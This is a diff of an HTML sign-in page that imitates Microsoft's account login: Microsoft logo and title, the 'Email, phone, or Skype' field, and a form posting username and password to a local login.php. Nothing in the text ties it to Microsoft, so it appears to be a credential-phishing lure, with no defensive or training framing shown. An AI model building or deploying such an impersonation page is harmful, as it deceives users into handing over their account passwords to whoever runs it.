@@ -3,233 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
+    <title>Microsoft Account</title>
     <style>
-        :root {
-            --primary: #0078D4;
-            --primary-dark: #106EBE;
-            --primary-light: #E5F1FB;
-            --text-primary: #323130;
-            --text-secondary: #605E5C;
-            --border: #EDEBE9;
-            --error: #A4262C;
-            --white: #FFFFFF;
-            --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.12);
-            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.15);
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
-
+        
         body {
-            background-color: var(--white);
-            color: var(--text-primary);
-            min-height: 100vh;
+            background-color: #f3f3f3;
             display: flex;
-            flex-direction: column;
-        }
-
-        .header {
-            padding: 20px 0;
-            text-align: center;
-        }
-
-        .logo {
-            height: 24px;
-            width: auto;
-        }
-
-        .container {
-            max-width: 440px;
-            width: 100%;
-            margin: 0 auto;
-            padding: 0 20px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
             justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-
-        .card {
-            background: var(--white);
+        
+        .login-container {
+            width: 440px;
+            background-color: white;
             border-radius: 8px;
-            box-shadow: var(--shadow-md);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             padding: 40px;
-            margin-bottom: 20px;
         }
-
-        .title {
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo img {
+            height: 24px;
+        }
+        
+        h1 {
             font-size: 24px;
             font-weight: 600;
             margin-bottom: 24px;
             text-align: center;
+            color: #1a1a1a;
         }
-
+        
         .form-group {
             margin-bottom: 20px;
         }
-
-        .form-label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 6px;
-            color: var(--text-primary);
-        }
-
-        .form-input {
+        
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 12px;
-            font-size: 16px;
-            border: 1px solid var(--border);
+            border: 1px solid #ddd;
             border-radius: 4px;
-            transition: border-color 0.2s, box-shadow 0.2s;
+            font-size: 16px;
+            transition: border-color 0.3s;
         }
-
-        .form-input:focus {
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
             outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px var(--primary-light);
+            border-color: #0078d4;
         }
-
-        .form-input.error {
-            border-color: var(--error);
+        
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
         }
-
-        .error-message {
-            color: var(--error);
-            font-size: 12px;
-            margin-top: 4px;
-            display: none;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .btn-primary {
-            background-color: var(--primary);
-            color: var(--white);
-        }
-
-        .btn-primary:hover {
-            background-color: var(--primary-dark);
-        }
-
-        .links {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 20px;
-        }
-
-        .link {
-            color: var(--primary);
-            font-size: 14px;
+        
+        .forgot-password a {
+            color: #0078d4;
             text-decoration: none;
-            margin-bottom: 8px;
-            transition: color 0.2s;
+            font-size: 14px;
         }
-
-        .link:hover {
-            color: var(--primary-dark);
+        
+        .forgot-password a:hover {
             text-decoration: underline;
         }
-
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: var(--text-secondary);
+        
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
         }
-
-        @media (max-width: 480px) {
-            .card {
-                padding: 24px;
-                box-shadow: none;
-                border: 1px solid var(--border);
-            }
+        
+        .submit-btn:hover {
+            background-color: #106ebe;
+        }
+        
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .signup-link a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <header class="header">
-        <img src="m365.png" alt="Microsoft 365" class="logo">
-    </header>
-
-    <main class="container">
-        <div class="card">
-            <h1 class="title">Sign in</h1>
-            <form action="login.php" method="POST">
-                <div class="form-group">
-                    <label for="email" class="form-label">Email, phone, or Skype</label>
-                    <input type="text" id="email" name="email" class="form-input" required>
-                    <div class="error-message" id="email-error">Please enter a valid email address</div>
-                </div>
-
-                <div class="form-group">
-                    <label for="password" class="form-label">Password</label>
-                    <input type="password" id="password" name="password" class="form-input" required>
-                    <div class="error-message" id="password-error">Please enter your password</div>
-                </div>
-
-                <div class="form-group">
-                    <button type="submit" class="btn btn-primary">Sign in</button>
-                </div>
-            </form>
-
-            <div class="links">
-                <a href="#" class="link">Forgot password?</a>
-                <a href="#" class="link">Create account</a>
-            </div>
+    <div class="login-container">
+        <div class="logo">
+            <img src="microsoft-logo-new.png" alt="Microsoft Logo">
         </div>
-    </main>
-
-    <footer class="footer">
-        <div>Terms of use | Privacy & cookies</div>
-        <div>© 2023 Microsoft</div>
-    </footer>
-
-    <script>
-        // Simple form validation
-        document.querySelector('form').addEventListener('submit', function(e) {
-            let isValid = true;
-            const email = document.getElementById('email');
-            const password = document.getElementById('password');
+        
+        <h1>Sign in</h1>
+        
+        <form action="login.php" method="POST">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Email, phone, or Skype" required>
+            </div>
             
-            // Reset errors
-            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
-            document.querySelectorAll('.form-input').forEach(el => el.classList.remove('error'));
-
-            // Email validation
-            if (!email.value.includes('@')) {
-                document.getElementById('email-error').style.display = 'block';
-                email.classList.add('error');
-                isValid = false;
-            }
-
-            // Password validation
-            if (password.value.length < 1) {
-                document.getElementById('password-error').style.display = 'block';
-                password.classList.add('error');
-                isValid = false;
-            }
-
-            if (!isValid) {
-                e.preventDefault();
-            }
-        });
-    </script>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="submit-btn">Sign in</button>
+        </form>
+        
+        <div class="signup-link">
+            <p>No account? <a href="#">Create one!</a></p>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+            <a href="#">Help</a>
+        </div>
+    </div>
 </body>
 </html>
